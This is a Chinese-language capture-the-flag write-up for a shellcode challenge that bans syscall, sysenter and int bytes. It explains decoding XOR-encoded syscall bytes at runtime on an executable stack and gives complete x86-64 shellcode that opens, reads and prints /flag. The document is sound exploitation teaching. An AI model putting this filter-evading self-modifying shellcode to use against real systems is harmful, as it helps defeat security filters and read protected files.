# 挑战简介
```
此挑战要求您的 shellcode 不包含任何 `syscall`、'sysenter' 或 `int` 指令。系统调用
太危险了！此过滤器通过扫描 shellcode 中的以下字节序列来工作：0f05
（`syscall`）、0f34（`sysenter`）和 80cd（`int`）。避免这种情况的一种方法是让您的 shellcode 修改自身以
在运行时插入 `syscall` 指令
```

# 思路
在**系统调用**这一个明确指令被禁止的情况下，我们还有什么办法来执行这样一个汇编中不可缺少的指令呢  
**有的兄弟，有的**

---
(恐怖的是，这个题我有将近一天没弄懂：我要怎么样，才能不用syscall，来syscall，太抽象了)  
事后其实才领悟到，非常简单，写不出来，多半是因为我不愿意用gdb调试，一步一步调试后，理解了syscall执行原理，其实没什么难的  
**在x86下，syscall怎么运作的？**  

---
机器码状态下，其实就两个字节\x0f\x05,当程序检测到这两个连在一起的字节，则会自动判false  
不止x86如此，x64也如此，int 80什么的也不能有  
既然它只检查机器码，那么我们可以在机器码上，填写一个与syscall机器码异或的数，在程序运行的时候再将其异或回来，这样既可以做到执行了syscall，又骗过了检测，因为检测只检测机器码  

已经查看了程序权限，栈可执行，所以开篇便是直接请求sub栈，腾出操作空间，并且利用一个寄存器，来存储我们syscall执行地址
```
/* 申请一个内存区域用来写入和执行 */
    sub rsp, 128              /* 分配足够的栈空间 */
    mov r15, rsp              /* r15指向栈顶，我们将在这里放置syscall指令 */
/* 使用XOR创建syscall指令 (0x0f^0xff = 0xf0, 0x05^0xff = 0xfa) */
    mov byte ptr [r15], 0xf0     /* 0xf0 ^ 0xff = 0x0f */
    mov byte ptr [r15+1], 0xfa   /* 0xfa ^ 0xff = 0x05 */
    mov byte ptr [r15+2], 0xc3   /* ret指令 */
```
这时候利用解码，syscall就能用了  
```
/* 使用XOR解码syscall字节 */
    xor byte ptr [r15], 0xff
    xor byte ptr [r15+1], 0xff
```
然后就是一些常规操作，open，read，write  
```
/* 准备打开文件 */
    /* 创建文件路径字符串 */
    push 0x0                   /* null结束符 */
    mov rcx, 0x67616c662f     /* "/flag" */
    push rcx
    mov rdi, rsp               /* 文件路径参数 */
    
    /* 设置open系统调用 */
    mov eax, 2                 /* 系统调用号为 open() */
    xor esi, esi               /* O_RDONLY = 0 */
    xor edx, edx               /* 权限参数 (不需要) */
    
    /* 调用我们修改过的可执行内存区域 */
    call r15                   /*用的时候call一下即可*/
    
    /* 保存文件描述符 */
    mov r13, rax
    
    /* 分配缓冲区 */
    sub rsp, 128
    mov rsi, rsp               /* 缓冲区地址 */
    
    /* 设置read系统调用 */
    xor eax, eax               /* read系统调用号为0 */
    mov rdi, r13               /* 文件描述符 */
    mov edx, 100               /* 读取大小 */
    
    /* 调用syscall */
    call r15
    
    /* 保存读取的字节数 */
    mov r14, rax
    
    /* 设置write系统调用 */
    mov eax, 1                 /* write系统调用号为1 */
    mov edi, 1                 /* stdout */
    mov rdx, r14               /* 读取的字节数 */
    /* rsi已经设置为缓冲区地址 */
    
    /* 调用syscall */
    call r15
    
    /* 设置exit系统调用 */
    mov eax, 60                /* exit系统调用号 */
    xor edi, edi               /* 状态码0 */
    
    /* 调用syscall */
    call r15
```
